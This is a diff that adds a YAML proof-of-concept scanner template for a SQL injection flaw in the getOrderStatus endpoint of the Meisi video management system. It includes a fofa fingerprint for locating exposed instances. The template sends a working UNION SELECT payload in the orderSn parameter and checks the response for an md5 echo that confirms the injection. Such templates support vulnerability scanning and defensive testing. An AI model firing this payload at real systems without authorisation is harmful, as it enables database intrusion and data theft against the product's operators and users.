@@ -1,0 +1,21 @@
+id: poc-yaml-msvod-getorderstatus-sqli
+info:
+  name: 魅思视频管理系统 getOrderStatus SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 魅思视频管理系统
+  fofa: app="魅思-视频管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/getOrderStatus
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(md5({{.t1}})
+    AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
+  expression: "status_code == 200 && \ncontains(find_json(body,\"data.orderStatus\"\
+    ), t2) && \ncontains(find_json(body,\"data.orderStatus\"), \"0\")\n"
+transport: http
